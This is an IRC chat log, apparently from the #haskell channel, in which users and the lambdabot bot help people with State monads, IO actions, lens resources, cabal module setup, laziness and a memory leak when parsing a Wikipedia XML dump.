10:10:28 <mm_freak> no idea
10:10:33 <fruitFly> mm_freak: why linux ?
10:10:45 <mm_freak> because i'm used to it and it supports my hardware
10:11:32 <fruitFly> mm_freak: I'm drawn to linux because it isn't windows or mac and very commonly used I guess
10:12:03 <mm_freak> it's a good choice
10:12:16 <mm_freak> but it doesn't mean that there can't be a better one
10:12:26 <mm_freak> if you're really interested, just try out the others as well
10:13:31 <scroy> hey, so i have a Loc record with x and y
10:13:44 <scroy> and I try let sc = state \l -> ( "Moved left", l {x=x l-1})
10:14:00 <mm_freak> scroy: that's a syntax error
10:14:45 <scroy> and I try let sc = state $ \l -> ( "Moved left", l {x=x l-1})
10:14:54 <mm_freak> scroy: still a syntax error
10:15:07 <mm_freak> (although you observe it as a type error in that case)
10:15:13 <scroy> ok it works for me
10:15:20 <scroy> the syntax.
10:15:35 <scroy> How do i observe it as a type error?
10:15:55 <mm_freak> sorry, i misread your code =)
10:16:04 <mm_freak> sorry for interrupting‚Ä¶  go on
10:16:12 <scroy> the error is No instance for (MonadState Loc m0)
10:16:50 <scroy> should be MonadState Loc String, right?
10:17:06 <mm_freak> no, it should be MonadState Loc (State Loc)
10:17:25 <mm_freak> the reason you get this is that it can't infer the monad, likely because you're not using sc
10:17:59 <Breadmonster> Can someone explain the difference between String and IO String to me?
10:18:16 <mm_freak> Breadmonster: IO String is to String what /bin/ls is to a list of files
10:18:41 <tromp> it's the difference between a burrito and a recipe for making a burrito
10:18:44 <mm_freak> it's an action that results in a String
10:18:45 <scroy> mm_freak: but is it clear that i want to capture a state computation like so ?
10:18:49 <ccasin> Breadmonster: something of type String is a String.  Something of type IO String is a computation that is allowed to talk to the outside world and compute a string
10:19:03 <jbracker> (a -> Bool) -> [a] -> ([a], [[a]])
10:19:04 <Breadmonster> So a String is data, IO String is a function?
10:19:07 <mm_freak> scroy: yeah, pretty much‚Ä¶  we need more context to help you
10:19:14 <mm_freak> Breadmonster: no, IO String is an IO-action
10:19:22 <Breadmonster> mm_freak: Okay, fine.
10:19:24 <mm_freak> Breadmonster: a function has a "->" in its type signature
10:19:28 <scroy> mm_freak: i think what i really want is State Loc String, to use with runState sc (Loc{x=0,y=0})
10:19:37 <ccasin> Breadmonster: a little bit - if you think of it as a function that takes in the "state of the world"
10:19:44 <mm_freak> scroy: if you actually do that it should work fine
10:19:50 <Breadmonster> Alright.
10:19:57 <ccasin> but not in the sense of a normal Haskell function
10:19:57 <Breadmonster> How do I convert from IO String to String?
10:19:58 <scroy> mm_freak: but how do i construct such a monad?
10:20:06 <mm_freak> Breadmonster: you don't
10:20:17 <mm_freak> Breadmonster: do x <- getLine; ‚Ä¶ do something with x ‚Ä¶
10:20:17 <johnw> Breadmonster: you can use the string within another IO action
10:20:53 <Breadmonster> mm_freak: so something like this is legal?
10:21:00 <mm_freak> Breadmonster: in "x <- getX" in do-notation, where getX is an IO T, x is a T
10:21:18 <scroy> mm_freak: er, monadic value?
10:21:20 <Breadmonster> mm_freak: do  name <- getLine ; printStrLn (length name)
10:21:33 <mm_freak> scroy: what do you mean?  you want to implement it yourself?
10:21:42 <mm_freak> (as opposed to using Control.Monad.State)
10:21:56 <FreeFull> Haskell doesn't have any  IO a -> a   function
10:22:05 <scroy> mm_freak: ah, it does work..
10:22:05 <mm_freak> Breadmonster: well, 'print', but apart from that yes
10:22:21 <Breadmonster> mm_freak: what about print?
10:22:28 <mm_freak> s/printStrLn/print/
10:22:53 <Breadmonster> mm_freak: Oh, alright, I get your point.
10:23:05 <Breadmonster> Does print call show?
10:23:09 <mm_freak> yeah
10:23:13 <mm_freak> print = putStrLn . show
10:23:15 <tac> :t print
10:23:19 <lambdabot> Show a => a -> IO ()
10:27:25 <`Jake`> @hoogle a -> [Maybe a] -> a
10:27:25 <lambdabot> Data.Maybe fromMaybe :: a -> Maybe a -> a
10:27:28 <lambdabot> Prelude maybe :: b -> (a -> b) -> Maybe a -> b
10:27:28 <lambdabot> Data.Maybe maybe :: b -> (a -> b) -> Maybe a -> b
10:27:38 <`Jake`> hmph
10:27:46 <sproingie> IO is the Monad Of Doctor Moreau, there's no escape
10:28:12 <FreeFull> `Jake`: Maybe you want something like \x -> map (fromMaybe x)
10:28:41 <`Jake`> yeah, I just hoped there was a library function for that
10:29:12 <`Jake`> :t foldl fromMaybe "foo" ["bar","baz"]
10:29:16 <lambdabot>     Couldn't match expected type `Maybe [Char]'
10:29:16 <lambdabot>                 with actual type `[Char]'
10:29:16 <lambdabot>     In the expression: "bar"
10:29:33 <`Jake`> > foldl fromMaybe "foo" (map Just ["bar","baz"])
10:29:35 <lambdabot>   "baz"
10:29:42 <`Jake`> shoudl work
10:33:22 <amyers> So just read this tutorial on the Lens library
10:33:23 <amyers> http://www.haskellforall.com/2013/05/program-imperatively-using-haskell.html
10:33:32 <amyers> Does anyone know of anything like that more more in depth
10:33:35 <amyers> it's pretty short
10:34:00 <simpson> amyers: Did you see the examples in the git repository?
10:35:04 <amyers> simpson: Yeah, I was hoping for a more guided tour
10:35:08 <amyers> to star with
10:35:14 <amyers> s/star/start
10:35:45 <simpson> Well, that blog post seems like it's pretty deep.
10:36:59 <edwardk_> amyers: i have given a couple of talks on lens, one went into some depth about how lens is constructed, but i have yet to do a deep 'how to use lens' talk. i'm going to do a workshop in ~2 months at lambdajam though
10:37:14 <Eduard_Munteanu> The wiki on lens' github page has quite a bit on it.
10:37:28 <edwardk_> amyers: i'll try to make my slides and materials available online afterwards if nothing else
10:37:50 <edwardk_> https://github.com/ekmett/lens/wiki has a bit of stuff on it
10:37:55 <amyers> edwardk_: I have watched the one you linked to in the lens docs.  That was helpful
10:38:09 <amyers> edwardk_: Ah, hadn't seen the wiki, thanks
10:38:32 <edwardk_> #haskell-lens is also really useful
10:38:41 <amyers> edwardk_: I like the cheat sheet
10:39:42 <tromp> so, edward, do you wear glasses or lenses:-?
10:42:44 <chrisdotcode> hello everyone :)
10:43:16 <edwardk_> tromp: i'm supposed to. i rarely remember to wear my glasses
10:43:29 <johnw> i guess then your vision isn't really that bad :)
10:43:52 <johnw> for me, forgetting is equal to living in a world of barely distinguishable elements
10:44:18 <chrisdotcode> so guys I'm working with gloss and I have an IO Picture, but how do I convert it to a Picture?
10:44:30 <johnw> chrisdotcode: you don't
10:44:42 <aristid> johnw: even if it's not that bad, i wouldn't want to walk across a road where people drive without their glasses.
10:44:50 <johnw> you can, in a do block, do x <- myIOPicture, and then use x
10:45:04 <chrisdotcode> "    Couldn't match expected type `Picture'
10:45:04 <chrisdotcode>                 with actual type `IO Picture'
10:45:04 <chrisdotcode>     In the third argument of `display', namely `picture'
10:45:04 <chrisdotcode> "
10:45:06 <chrisdotcode> yeah, okay.
10:45:13 <chrisdotcode> I knew it was something monadic
10:45:17 <chrisdotcode> thanks :)
10:54:57 <chrisdotcode> guys, how do you do multi-line comments?
10:55:10 <chrisdotcode> er, nevermind, I'll google it.
10:55:16 <geekosaur> {- foo -}
10:55:29 <`Jake`> > {- foo -}
10:55:33 * hackagebot llvm-base 3.2.0.0 - FFI bindings to the LLVM compiler toolkit.  http://hackage.haskell.org/package/llvm-base-3.2.0.0 (BenjaminSaunders)
10:55:33 <lambdabot>   not an expression: `{- foo -}'
10:55:35 * hackagebot llvm 3.2.0.0 - Bindings to the LLVM compiler toolkit.  http://hackage.haskell.org/package/llvm-3.2.0.0 (BenjaminSaunders)
10:55:46 <simpson> chrisdotcode: It's considered best style to use -- comments. {- comments -} work fine but many places don't approve of them for anything besides compiler directives.
10:56:02 <oconnor0> simpson: many places don't approve of them?
10:56:32 <johnw> the Haskell Approval Committee says, no!
10:56:34 <simpson> oconnor0: You're right, that was presumptuous.
10:56:50 <simpson> But tools like haddock won't document {- -} comments, right?
10:56:57 <johnw> it will
10:57:02 <johnw> {- | hello -}
10:57:03 <simpson> (*My* workplace, at least, doesn't like them.)
10:57:08 <simpson> johnw: Huh. TIL.
10:57:11 * simpson butts out
10:57:17 <`Jake`> it seems like using them for module descriptions would make sense
10:57:24 <monochrom> I use {- -} all the time. even for single lines. the fact remains that any single line today will grow into many lines tomorrow. why bother adding -- manually.
10:57:52 <`Jake`> monochrom: because your editor can do it for you
10:57:55 <johnw> i especially use {- -} comments for really long ones, like Tutorial modules
10:58:20 <monochrom> approximately my only use of -- is to comment out a block of code, and it's -- just because the emacs haskell mode uses it
10:58:43 <johnw> monochrom: do you use {- ^ foo -} documents to document parameters?
10:58:50 <johnw> s/documents/comments
10:58:54 <`Jake`> that's pretty much the only thing for which I use {- -}
10:59:00 <`Jake`> commenting out blocks
10:59:21 <`Jake`> besides {-# #-} of course
10:59:39 <monochrom> yes, I use {- -} for haddocks too
11:00:05 <johnw> I love opinions.  They are so easy
11:00:19 <staafl> is there a more general version of scanl?
11:00:30 <Taneb> johnw: opinions aren't associative!
11:00:31 <staafl> i want the seed to change independently of the output result
11:00:39 <adimit> ok, so here's a crazy question: (how) Can I establish a partial order on a set of types, and have it checked at compile time? Ideally, for a PO-Set ‚ü®T,‚äë‚ü© where T is a set of ADTs, and ‚äë the PO relation, I'd like to say something like f :: (a :‚äë œÑ) => a for any œÑ ‚àà T. But I have the feeling that this is not (currently?) possible.
11:00:40 <johnw> Taneb: you mean, that works for Traversable?
11:00:54 <monochrom> well, I'm offering not so much opinion as counterexamples to sterotypes
11:01:34 <staafl> something like (a -> c -> (a,b)) -> a -> [c] -> [b]
11:02:43 <adimit> (essentially, this sort of system would "emulate" subtyping, too. So I've looked at OOHaskell and friends, but I don't need full "OO".)
11:04:30 <adimit> (btw. I'm just asking because if someone already has this, I don't want to re-implement it. Otherwise, I'm currently doing it by myself anyway, so we'll see what comes out of that.)
11:06:21 <Ralith> adimit: out of curiosity, what do you need it for?
11:07:47 <stavroshs> hi! foldl cannot be applied to infinite lists, but scanl can be applied, right?
11:07:59 <k00mi_> adimit: did you see that vinyl library? it has some kind of subtyping
11:08:09 <johnw> @src scanl
11:08:09 <lambdabot> scanl f q ls = q : case ls of
11:08:10 <lambdabot>     []   -> []
11:08:10 <lambdabot>     x:xs -> scanl f (f q x) xs
11:08:10 <adimit> Ralith: I'm implementing a typed description logic as a DSL. All structures are typed, and can be subtyped (there's some additional structure on top of that, which would require extensible records. I hope to be able to model with lenses, or perhaps with something like vinyl.)
11:08:13 <k00mi_> adimit: http://www.jonmsterling.com/posts/2013-04-06-vinyl-modern-records-for-haskell.html
11:08:34 <Ralith> adimit: sounds cool
11:08:42 <adimit> k00mi_: yes, very much. I'll probably use (something like) vinyl for part of my project, but the subtyping relation in vinyl is not strong enough for me.
11:09:02 <k00mi_> ok
11:09:02 <monochrom> yes stavroshs
11:09:23 <monochrom> > take 3 (scanl (+) 0 (repeat 0))
11:09:26 <stavroshs> monochrom: due to the "q :" part, right?
11:09:26 <lambdabot>   [0,0,0]
11:09:32 <beaky> hello
11:09:35 <monochrom> yes
11:09:35 <stavroshs> in the definition
11:09:57 <fizbin> stavroshs: Due to the fact that scanl doesn't need to finish the entire input list to give you some of the output.
11:10:13 <monochrom> which means the "q :" part
11:10:17 <fizbin> stavroshs: Which, yes, is done with the "q:" bit.
11:10:17 <stavroshs> this is the non-strictness ?
11:10:23 <monochrom> yes
11:10:28 <stavroshs> ok :-)
11:11:02 <fizbin> stavroshs: scanl gets its non-strictness from the non-strictness of (:)
11:11:21 <beaky> what is the difference between non-strictness and laziness?
11:11:24 <monochrom> > take 3 (scanl (+) 0 undefined)
11:11:29 <lambdabot>   [0*Exception: Prelude.undefined
11:11:36 <johnw> beaky: non-strictness is denotational, laziness is operational
11:11:57 <beaky> ah
11:12:12 <johnw> see http://www.vex.net/~trebla/haskell/lazy.xhtml for a full explanation
11:12:31 <johnw> laziness is a way of implementing non-strictness
11:12:33 <monochrom> denotational means: what answer you'll get. operational means: what steps are taken to get that answer
11:12:51 <beaky> so it's like the difference between imperative and declarative programming?
11:13:01 <monochrom> I don't know
11:13:05 <beaky> ah
11:13:16 <monochrom> I no longer know what's imperative, what's declarative.
11:13:29 <beaky> me too :(
11:13:31 <johnw> i don't either
11:13:35 <beaky> I don't know anything
11:13:35 <monochrom> all definitions I've seen are subjective
11:13:43 * fizbin manages to get a ghci that can't be killed except with a -9 by using foldl on an infinite list.
11:14:27 <sproingie> not even ctrl-\ did it?
11:15:06 <johnw> C-\ is kill -3
11:15:16 <sproingie> i always forget the number
11:15:25 <johnw> kill -QUIT :)
11:15:32 <sproingie> i like symbolic names.  "kill -KILL" is just so emphatic
11:15:32 <fizbin> I tried ctrl-C, kill, kill -QUIT ...
11:16:14 <Ralith> Enigmagic: anything you want me to note on the release announcement mail to haskell-llvm?
11:16:46 <hpaste> just pasted ‚ÄúDefaulting‚Äù at http://hpaste.org/87508
11:16:54 <fizbin> > let t = foldl (\y x -> x:y) [] [0..] in take 5 t
11:16:59 <lambdabot>   mueval: ExitFailure 1
11:16:59 <lambdabot>  mueval: Prelude.undefined
11:17:01 <beaky> @src curry
11:17:02 <lambdabot> curry f x y = f (x, y)
11:17:24 <_just> how do i get the warning away? i know there is default but didn't get it to work
11:17:26 <fizbin> Whoa, weird. It wouldn't just tell me time limit exceeded.
11:20:44 <monochrom> um, Integral a cannot be defaulted to Double
11:21:25 <troydm> i have a feeling that Learn You a Haskell misses some crucial chapters that are essential for learning Haskell
11:21:28 <otters> kill, kill, KILL
11:21:36 <hpaste> just annotated ‚ÄúDefaulting‚Äù with ‚ÄúDefaulting (annotation)‚Äù at http://hpaste.org/87508#a87509
11:21:37 <troydm> like Monad Transformers and Concurrency related things
11:21:47 <`Jake`> > undefined
11:21:51 <lambdabot>   *Exception: Prelude.undefined
11:21:52 <beaky> what are monad transformers?
11:21:53 <_just> monochrom: i added the complete warning
11:21:59 <troydm> in comparison Learn You an Erlang includes everything
11:23:34 <monochrom> eh? I get no error message, and no warning message. no incidents. it compiles quietly.
11:23:59 <troydm> beaky: http://book.realworldhaskell.org/read/monad-transformers.html
11:24:07 <stavroshs> troydm: i have the same feeling - i'm new to haskell. any comprehensive book out there?
11:24:07 <fizbin> :t sqrt
11:24:12 <lambdabot> Floating a => a -> a
11:24:12 <geekosaur> monochrom, that's not th eproblem, it's the sqrt in the middle whose type is defaulted. (and whether it's warned by default  depends on the ghc version, IIRC)
11:24:14 <fizbin> :t floor
11:24:20 <lambdabot> (Integral b, RealFrac a) => a -> b
11:24:25 <monochrom> oh, I'll try 7.6.3
11:24:27 <johnw> beaky: monad transformers let you combine monads
11:24:36 <fizbin> Also, maybe try -Wall
11:24:40 <johnw> for example, StateT lets you combine State with some other monad, such as IO
11:24:46 <_just> monochrom: i use -Wall and ghc 7.6.3
11:24:58 <monochrom> 7.6.3 and 7.4.3 both give silences
11:25:00 <troydm> stavroshs: probably the best way to learn haskell is to start with learnyouahaskell and then read real world haskell
11:25:08 <fizbin> monochrom: with -Wall ?
11:25:12 <monochrom> then don't use -Wall. I never use it. obnoxious warnings.
11:25:30 <monochrom> I don't really care about what -Wall does
11:25:33 <fizbin> -Wall can be very useful for people learning haskell
11:25:43 <johnw> i build every project with -Wall
11:26:01 <ijp> some of RWH is broken now, so you'll need to be sure check the book comments when something doesn't work right
11:26:17 <monochrom> but presumably the GHC user's guide has a chapter on individual warning flags such as -fno-warn-unused-binds. it's on your hard disk
11:27:04 <_just> i'll use -fno-warn-type-defaults then
11:27:24 <stavroshs> troydm: i'm interested in maths and cs theory concerning haskell, as well. that's why i'm searching for a comprehensive book
11:27:56 <_just> ok thanks
11:27:57 <monochrom> I hope one day you'll realize that you use -Wall and then you have to add 12 -fno-warn-blahblah flags
11:28:19 <fizbin> _just: you can also write it as sqrtInt = floor . (sqrt :: Double -> Double) . fromIntegral
11:28:25 <_just> monochrom: i'm still learning so i hope this catches some things for me
11:28:51 <namor> hi! can someone help me with a module issue?
11:28:51 <namor> i am working on a module (OPS) that should contain a few submodules (OPS.ID, OPS.Bucket,...). OPS.Bucket has to import OPS.ID - but the only way that works is to move the Bucket.lhs file UP in the file hierarchy, which seems wrong.
11:29:13 <_just> fizbin: ok i'll considered it, thank you
11:29:30 <fizbin> monochrom: If you use -Wall from the start it's not so bad.
11:29:44 <adimit> -Wall is not only useful for newbies because it might catch undesired behaviour or errors, but because it makes them more aware of how GHC "thinks." Especially stuff like defaults.
11:29:50 <fizbin> And other people reading the code will be glad of the top-level stuff with type signatures.
11:30:01 <adimit> I prefer -Wall in my .cabal, and exclude stuff on a per-project or per-file basis.
11:30:02 <johnw> namor: a lot of people use a Private or Common module for common imports within a project
11:30:09 <johnw> (or Internal)
11:30:14 <adimit> (then again, I'm no seasoned Haskell veteran.)
11:30:22 <namor> johnw, so.. it's not possible to import OPS.A from OPS.B ?
11:30:30 <johnw> sure you can
11:30:31 <monochrom> I use no -Wall from the start, and it's great, it's much better than "not so bad".
11:30:34 <johnw> import OPS.A
11:30:36 <troydm> stavroshs: any type theory book will do but probably you should start with this book http://is.gd/jesmUT
11:30:46 <troydm> if you are interested in theory behind haskell
11:30:52 <beaky> is there a way to automatically define fmap and folds for my recursive typeS?
11:31:13 <adimit> beaky: have you looked into Traversable and Foldable?
11:31:18 <beaky> e.g. data Tree a = Leaf a | Node a (Tree a) (Tree a) deriving Functor
11:31:20 <johnw> beaky: yes, deriving (Functor, Foldable, Traversable)
11:31:20 <beaky> ah
11:31:22 <adimit> (also Functor.)
11:31:30 <beaky> hmm I've nver used Traversable before
11:31:49 <johnw> traversable gives you traverse (aka generalized mapM) and sequenceA
11:31:54 <beaky> wow neat
11:32:11 <troydm> stavroshs: and then this book http://is.gd/V4pY6T
11:32:15 <stavroshs> troydm: thanks, i read this and then i'll go for TAPL by B. Pierce. It was a bit frustrating for me
11:32:28 <johnw> foldable gives you generalized forM and the various folds
11:32:29 <namor> johnw, so.. im in the OPS directory. 2 files in there: Bucket.lhs and ID.lhs. ID.lhs contains this line: "> module OPS.ID where". Bucket.lhs these lines:
11:32:29 <namor> > module OPS.Bucket where
11:32:29 <namor> > import OPS.ID
11:32:29 <namor> Error: Could not find module `OPS.ID'
11:32:34 <lambdabot>   <hint>:1:1: parse error on input `import'
11:32:35 <lambdabot>   can't find file: L.hs
11:32:36 <johnw> sorry, mapM_ and forM_
11:32:42 <johnw> traversable gives mapM and forM
11:33:02 <johnw> namor: which directory you're in doesn't control what you can import
11:33:18 <johnw> i'm in FP/IsolationRunner right now, and within those modules I'm importing FP.IsolationRunner.Foo
11:33:39 <johnw> the cabal files is what indicates what is importable, not the directory, if you are building with cabal
11:33:53 <monochrom> http://is.gd/V4pY6T is the same as http://www.amazon.com/Advanced-PHP-Techniques/dp/0262162091/
11:34:17 <namor> johnw, not yet, im just using "ghc" / "runhaskell" and C-c,C-l in emacs...
11:34:33 <johnw> hag, ok
11:34:34 <johnw> ah, ok
11:34:44 <namor> johnw, and it would suck if i could not test in emacs any more because i depend on cabal to build..
11:35:00 <johnw> i'm not sure of the answer then
11:35:03 <johnw> i only ever use cabal
11:35:28 <namor> okay, i'll probably restructure the hierarchie then. thanks for your help, johnw!
11:35:44 <adimit> namor: in Emacs, you just use haskell-mode
11:35:53 <dmj> namor: check how you are naming your modules
11:35:54 <namor> adimit, i do
11:36:09 <adimit> which respects .cabal files, and even uses cabal-dev (which is currently the "best" way to develop packages due to cabal-hell.)
11:36:10 <namor> dmj, what are the right names?
11:36:27 <namor> Oh! So i SHOULD use cabal.
11:36:31 <adimit> (careful of opinion in the above statement.)
11:37:09 <adimit> namor: there is no should. But you'll have an easier time using cabal if you're doing anything that's supposed to actually do stuff in the end. If you're just experiment, then go on using ghc --make or whatever.
11:37:37 <dmj> namor: I'm unsure in your case. But I'd try to copy the pros: https://github.com/bos/attoparsec
11:38:13 <adimit> (note that cabal/cabal-dev will have to be in Emacs' $PATH for haskell-mode to find them. haskell-mode will actually query you for a project root directory and .cabal file when you launch the interactive mode.)
11:39:24 <dmj> namor: I use virthualenv with haskell-mode in emacs and it works well ootb
11:39:54 <namor> okay, this should keep me going in the right direction. i guess i can figure out the rest by myself (with a lil help from attoparsec..). thanks adimit and dmj. i'll will have a look at virthualenv if im stuck.
11:40:18 <monochrom> don't forget to read cabal user's guide
11:40:32 <monochrom> http://www.haskell.org/cabal/users-guide/
11:40:41 <monochrom> it used to come with GHC
11:41:29 <fizbin> I've never managed to figure out cabal.
11:41:41 <johnw> cabal is a big kitten
11:41:47 <fizbin> I guess I've never really had a pressing need.
11:41:48 <johnw> just don't pet him the wrong way
11:42:05 <ion> It‚Äôs very easy to cabalize a package.
11:42:22 <dcoutts> I thought it was a burrito, or am I getting confused?
11:42:44 <fizbin> Yeah. I guess I'm just not quite to the point where I'm thinking of this collection of code I have as a package.
11:42:55 <monochrom> there is fairly little to figure out. unless you want to set up your own repo. at which point it's undocumented anyway.
11:44:09 <johnw> fizbin: I use cabal even for single-file scripts
11:44:15 <fizbin> I mean, right now all I really have is a collection of files of POC code for different parts of the system to demonstrate that it's plausible we'll eventually build this whole thing we're designing.
11:44:15 <dmj> namor: please check out "haskell development methods" a good simple intro to cabal. http://shuklan.com/haskell/lec10.html#/0/7
11:44:29 <johnw> ah, I see
11:44:31 <beaky> what kinds of things are definable in Haskell that are not easy to define in non-strict languages like scala or ML?
11:44:43 <beaky> in strict *
11:44:45 <johnw> beaky: infinite lists
11:44:46 <namor> dmj this looks easy :-)
11:44:52 <fizbin> I'm to the point where if I were writing C I'd write a Makefile, but I'm not to the point where if I were writing perl I'd create a CPAN-able package.
11:44:52 <johnw> oh, sorry
11:44:54 <danharaj> ifthenelse as a plain old function.
11:44:55 <johnw> you said non-strict
11:45:09 <sproingie> control structures in general as plain old functions
11:45:14 <johnw> fizbin: then you cabal as a make
11:45:16 <beaky> like const?
11:45:17 <monochrom> typo. "strict" is meant
11:45:24 <johnw> ah, then: infinite lists :)
11:45:26 <dcoutts> beaky: arrays where the elements are defined in terms of other elements in the same array
11:45:30 <fizbin> johnw: Do you have any cabal-with-single-file examples?
11:45:32 <dmj> namor: it is :) comprehensive by no means
11:45:36 <johnw> sure, one sec
11:45:37 <sproingie> dcoutts: actually lisp can do that pretty easily
11:45:54 <dcoutts> sproingie: with memoisation?
11:45:54 <chrisdotcode> does haskell not like tabs, or something?
11:45:57 <sproingie> some weird sharp-macro syntax i can't remember
11:45:59 <johnw> fizbin: https://github.com/jwiegley/script-template
11:46:04 <chrisdotcode> I'm getting some weird errors with tabs and do-notation...
11:46:10 <johnw> that's the template I clone for every script I write
11:46:16 <monochrom> John Hughes's examples cannot be written in ML. can be rewritten, but would kill the decomposition
11:46:17 <dcoutts> sproingie: and if so, then it's just implementing lazyness (which is not that hard)
11:46:18 <Clint> chrisdotcode: it likes them as long as they mean 8 spaces
11:46:31 <chrisdotcode> Clint: ah, okay. I was using 4. I'll try that now.
11:46:32 <chrisdotcode> thanks
11:46:35 <sproingie> dcoutts: oh it's not lazy, so it's way less powerful
11:46:43 <danharaj> chrisdotcode: if your tabs aren't 8 spaces you will experience pain. Try to autoconvert tabs to spaces with your editor.
11:46:50 <sproingie> might only allow backreference, not sure
11:47:08 * chrisdotcode changes on line in .vimrc :)
11:47:10 <sproingie> might do forward if the length is known
11:47:32 <dmj> How does SML do monads?
11:47:35 <beaky> is it possible to define arrays in haskell (just like how you can roll your own List as 'data List = Empty | Cons a (List a)') ?
11:47:38 <adimit> chrisdotcode: most haskellers prefer no spaces in their sources for that reason.
11:47:48 <johnw> no spaces??
11:47:53 <adimit> *tabs
11:47:55 <adimit> boo.
11:48:20 <chrisdotcode> yeah, I was under the impression that haskelles generally don't like tabs.
11:48:24 <sproingie> yah haskell's a little stricter than python there, python doesn't care as long as they line up
11:48:28 <fizbin> johnw: a blank Setup.hs?
11:48:30 <chrisdotcode> ...even though I love them :D
11:48:34 <sproingie> and if you mix them it pretty much hates you no matter what the size
11:48:37 <johnw> fizbin: yeah
11:48:50 <monochrom> fizbin: http://hackage.haskell.org/package/hello is a cabal example
11:48:50 <johnw> fizbin: if you use the Simple build type, you don't even need Setup.hs with recent cabals
11:49:03 <fizbin> johnw: I thought the standard was a Setup.hs that did something like "main = defaultMain" with some imports.
11:49:09 <johnw> yeah, it does
11:49:12 <`^_^v> is pattern matching across consecutive values (e.g. func 1 = ‚Ä¶; func 2 = ‚Ä¶ ; func 3 = ‚Ä¶;) more efficient than pattern matching against sparse values (1, 100, 1000)?
11:49:14 <johnw> but it's not necessary
11:49:28 <sproingie> so i guess python is actually more restrictive in just not permitting such mixing
11:49:47 <`^_^v> in ghc
11:49:54 <tgeeky> `^_^v: that's a strangely stated question.
11:49:56 <monochrom> fizbin: "cabal init" gives you the nothing-special Setup.hs
11:50:02 <adimit> `^_^v: I'm not sure, but I think you're looking for guards.
11:50:08 <monochrom> although, often it is not even used
11:50:26 <johnw> cabal init gives annoying dependencies
11:50:37 <johnw> i wish it wouldn't restrict them at all
11:50:44 <monochrom> that's also true
11:51:16 <`^_^v> tgeeky, i dont know how its implemented. jump table, binary search, etc
11:52:02 <geekosaur> because it's so much better when a new version of a dependency comes out and your package unexpectedly breaks. (see also last night's crypto-api fun)
11:52:06 <monochrom> `^_^v: linear search both ways. see the core code to be sure
11:52:13 <geekosaur> clearly that never happens and can be disregarded
11:52:24 <johnw> geekosaur: haha, yeah I heard about that this morning
11:52:26 <johnw> it broke stackage
11:52:44 <monochrom> it is effectively a lot of if-then-else and ==
11:53:57 <johnw> i've been really pining for LambdaCase and MultiWayIf lately
11:54:07 <johnw> been writing too many: forM_ mfoo $ \foo -> case foo of ...
11:54:33 <monochrom> lambda-case is nice
11:55:48 <bwr> I'm trying to parse a small subset of the wikipedia xml dump and collect letter pair counts using the following data structure (Map (Char,Char) Int) and I'm running out of memory. Is there a better data structure to use for this?
11:56:42 <namor> bwr, shouldn't that be no more than ~50^2 entries in the table?
11:56:49 <tromp> just make sure you dont hang on to old copies
11:56:53 <monochrom> first find out what is using your memory
11:57:13 <monochrom> do not opiniate. find.
11:57:23 <monochrom> err, s/opiniate/opine/
11:57:27 <bwr> I'll try, but I'm having trouble with that part
11:57:32 <johnw> well, your data structure isn't the problem
11:57:33 <bwr> I've been working on this for a few days
11:57:43 <bwr> johnw: that's good to know
11:57:45 <johnw> it's the algorithm building it that is holding onto too much
11:57:50 <bitonic> bwr: how many entries are you storing?
11:57:59 <bwr> anybody mind taking a look at the program to make sure i'm not doing anything obviously awful?
11:58:00 <bitonic> johnw: how do you know his data structure is not the problem?
11:58:10 <monochrom> but I'll break my own advice. I'll opine. the memory is spent in storing either the dump, or the xml tree, or both
11:58:19 <johnw> namor: what about other languages?  it could be 2^32^2
11:58:20 <bwr> monochrom: i'm using sax parsing using hexpat
11:58:34 <monochrom> ah, then my guess may be wrong
11:58:39 <bwr> johnw: its only a very small subset of wikipedia (140 mbs of xml)
11:58:52 <namor> bwr, how many "chars" do you support?
11:58:52 <johnw> bitonic: because (Char,Char) isn't a large enough space to exhaust his memory, since I doubt he's storing every Unicode codepoint
11:59:06 <bwr> namor: any that are found?
11:59:16 <namor> bwr, is it the english language dump?...
11:59:17 <bwr> http://hpaste.org/87510
11:59:19 <bwr> namor: yes
11:59:28 <namor> should not be too many then
12:00:27 <bitonic> johnw: oh right, I read ‚ÄòString‚Äô for some reason...
12:00:35 <johnw> bwr: the strict monad is not strict in every sense
12:00:38 <johnw> this has come up before
12:00:42 <johnw> strict state monad
12:00:56 <bwr> what do you mean by that?
12:01:03 <johnw> one sec, i'll look up the haskell-cafe post
12:01:06 <bwr> I've also tried the Writer monad in an earlier version
12:01:42 <bitonic> bwr: hexpat had leaks btw
12:01:52 <bitonic> not sure if it still does
12:02:10 <bwr> if i modify the program to just count the first character pair or just count the number of characters it works though
12:02:33 <namor> bwr, try to dump (print) the whole xml file after reading it
12:02:39 <bwr> it is still slower than i would expect for parsing 140 mbs of xml (around 1 to 2 minutes)
12:03:06 <bwr> namor: i have already tried that
12:03:15 <johnw> bwr: http://www.haskell.org/pipermail/haskell-cafe/2012-January/098955.html
12:03:17 <bwr> well, i dumped it after i parsed into Article data structure
12:03:20 <johnw> try that version of modify
12:03:32 <bwr> johnw: thanks i'll take a look
12:03:52 <bitonic> bwr: this is probably not your problem, but just in case... <http://www.haskell.org/pipermail/haskell-cafe/2013-April/107932.html>
12:03:53 <johnw> you may be building up not a state map, but a recipe of actions to build a state map :)
12:04:00 <bitonic> (I had vague memory of that message)
12:04:16 <namor> lazy io is so evil...
12:05:03 <bwr> is there a good alternative for xml stream parsing that would handle the full wikipedia dump potentially
12:05:14 <bwr> i haven't tried any other than hexpat
12:05:30 <johnw> i also don't think that's your problem
12:05:37 <johnw> processing the XML data lazily should be just fine
12:06:02 <johnw> you only need to move to something like xml-conduit if you need to free up the resource as soon as you're done reading it
12:06:14 <johnw> (rather than waiting on the GC)
12:07:06 <[swift]> curious if anyone has experience with moving code out of the IO monad using free monads. i've been reading up on the approach and it sounds like it might make it possible to test some code i can't test currently, but i'm curious about how much it's affected performance for others (intuitively it seems like there'd be a high abstraction cost)
12:07:27 <johnw> [swift]: Tekmo has tons of experience with that
12:07:35 <johnw> have you seen the "operational" library?
12:07:45 <johnw> it reduces the abstraction cost significantly
12:07:53 <[swift]> johnw: no, i've never heard of it! googling now
12:08:15 <namor> adimit, dmj i built a .cabal file and (in emacs) it seems to work now - but i HAVE to open+compile ./src/Main.lhs before any other files in the project - or i get a Module not found error again. But i can work this way fine in emacs, so thanks again!
12:08:18 <johnw> see also this series: http://comonad.com/reader/2011/free-monads-for-less/
12:09:02 <johnw> operational is using a similar trick, i believe it gets mentioned in a later article in the series
12:09:22 <bwr> johnw: it looks like that modify' might be what i needed; currently running and i'm only using less than 1 percent of memory
12:09:25 <[swift]> johnw: cool, thanks! these seem like some good resources
12:09:42 <johnw> bwr: yeah, your problem did sound awfully familiar :)
